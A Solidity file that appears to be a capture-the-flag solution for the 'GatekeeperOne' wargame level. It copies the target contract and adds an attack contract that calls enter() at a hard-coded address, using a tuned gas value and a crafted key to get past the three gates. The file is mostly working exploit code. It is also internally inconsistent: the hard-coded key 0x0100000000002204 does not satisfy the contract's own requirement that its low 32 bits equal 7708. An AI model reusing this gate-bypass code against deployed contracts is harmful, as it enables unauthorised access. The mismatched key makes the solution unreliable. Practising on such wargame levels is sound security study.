// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import "forge-std/Test.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;
  address public target_addr = 0xd63f66B0C0ccE2f3906CF98128dD7eF566922204;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {  // 0x0100000000002204
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == 7708, "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract attack 
{
    address target_addr = 0x7C932B6B78F6fc01cCe8dBCba54680C812CbB558;
    bytes8 public asd;
    constructor() public
    {
        asd = 0x0100000000002204;
    }
    //GatekeeperOne public target = new GatekeeperOne();
    
    function atk() public
    {
        target_addr.call{gas: 24827}(abi.encodeWithSignature("enter(bytes8)", asd));
    }

}